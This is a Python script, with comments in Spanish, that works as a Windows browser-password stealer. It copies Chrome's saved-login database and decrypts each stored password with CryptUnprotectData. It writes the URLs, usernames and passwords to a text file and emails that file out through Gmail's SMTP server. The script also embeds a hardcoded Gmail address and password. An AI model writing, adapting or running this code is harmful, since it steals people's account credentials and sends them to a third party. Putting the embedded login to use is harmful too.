import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time, datetime
import win32crypt
import os
import getpass
import sqlite3
import shutil


def sendMail():




    # Iniciamos los parámetros del script
    remitente = ''
    destinatarios = ['']
    asunto = '[RPI] Correo de prueba'
    cuerpo = 'Este es el contenido del mensaje'
    ruta_adjunto = r"ext.txt"
    nombre_adjunto = 'jeje.txt'
    # Creamos el objeto mensaje
    mensaje = MIMEMultipart()
    # Establecemos los atributos del mensaje
    mensaje['From'] = remitente
    mensaje['To'] = ", ".join(destinatarios)
    mensaje['Subject'] = asunto
    # Agregamos el cuerpo del mensaje como objeto MIME de tipo texto
    mensaje.attach(MIMEText(cuerpo, 'plain'))
    # Abrimos el archivo que vamos a adjuntar
    archivo_adjunto = open(ruta_adjunto, 'rb')
    # Creamos un objeto MIME base
    adjunto_MIME = MIMEBase('application', 'octet-stream')
    # Y le cargamos el archivo adjunto
    adjunto_MIME.set_payload((archivo_adjunto).read())
    # Codificamos el objeto en BASE64
    encoders.encode_base64(adjunto_MIME)
    # Agregamos una cabecera al objeto
    adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_adjunto)
    # Y finalmente lo agregamos al mensaje
    mensaje.attach(adjunto_MIME)
    # Creamos la conexión con el servidor
    sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
    # Ciframos la conexión
    sesion_smtp.starttls()
    # Iniciamos sesión en el servidor
    sesion_smtp.login('luciluciperi@gmail.com', '156354756954')
    # Convertimos el objeto mensaje a texto
    texto = mensaje.as_string()
    # Enviamos el mensaje
    sesion_smtp.sendmail(remitente, destinatarios, texto)
    # Crramos la conexión
    time.sleep(1)
    sesion_smtp.quit()


def file_create(string):
    f=open("ext.txt", "+w")
    f.write(string)
    f.close()

    sendMail()


def enter(coodb):
    c = sqlite3.connect("temp.db")
    cursor = c.cursor()

    query_select = 'SELECT origin_url, username_value,password_value FROM logins'
    cursor.execute(query_select)

    data = cursor.fetchall()
    cred = {}
    string = ''

    try:
        for url, user_name, pwd in data:
            pwd = win32crypt.CryptUnprotectData(pwd)
            # pwd = pwd.decode('utf8')
            cred[url] = (user_name, pwd[1])
            string += '\n URL: %s USER:%s PASS: %s \n' % (url, user_name, pwd[1].decode('utf8'))
            #print(string)

    except Exception as e:
        pass

    cursor.close()
    c.close()
    try:
        os.remove("temp.db")
    except Exception as e:
        pass

    file_create(string)


def get():
    path=os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    copdb=shutil.copy(path, "temp.db")
    enter(copdb)


if __name__=='__main__':
    get()









